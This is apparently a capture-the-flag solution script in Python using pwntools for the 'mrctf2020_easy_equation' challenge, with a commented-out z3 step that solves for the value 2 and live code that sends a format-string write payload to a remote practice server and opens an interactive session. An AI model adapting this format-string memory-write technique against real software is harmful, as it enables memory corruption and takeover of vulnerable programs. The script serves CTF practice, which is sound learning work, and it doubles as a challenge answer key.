from pwn import *


# solve --> judge == 2
"""

from z3 import *

judge = Int("judge")
s = Solver()
s.add(11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198)
s.check()
print(s.model())

"""

# p = process("./mrctf2020_easy_equation")
p = remote("node4.buuoj.cn", 27535)

context.arch = "amd64"

judge = 0x060105C 
answer = 2
offset = 8

pad = b"a"+fmtstr_payload(offset=8, writes={judge:answer}, numbwritten=1)
p.sendline(pad)

p.interactive()


